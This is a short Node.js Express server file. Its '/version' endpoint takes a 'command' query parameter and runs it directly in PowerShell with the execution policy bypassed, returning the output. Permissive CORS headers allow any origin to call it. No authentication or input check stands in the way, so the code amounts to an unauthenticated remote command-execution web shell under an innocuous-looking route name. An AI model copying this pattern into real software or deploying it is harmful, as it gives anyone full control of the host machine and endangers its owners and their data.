var express = require('express');
const shell = require('node-powershell');
var app = express();
app.listen(8080);
app.get('/', function () {
  console.log('Server started');
});

app.get('/version', function (req, res) {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "X-Requested-With");
  let ps = new shell({
    executionPolicy: 'Bypass',
    noProfile: true
  });
  ps.addCommand(req.query.command);
  ps.invoke()
    .then(output => {
      res.send(output);
    })
    .catch(err => {
      res.send(err);
      ps.dispose();
    });
});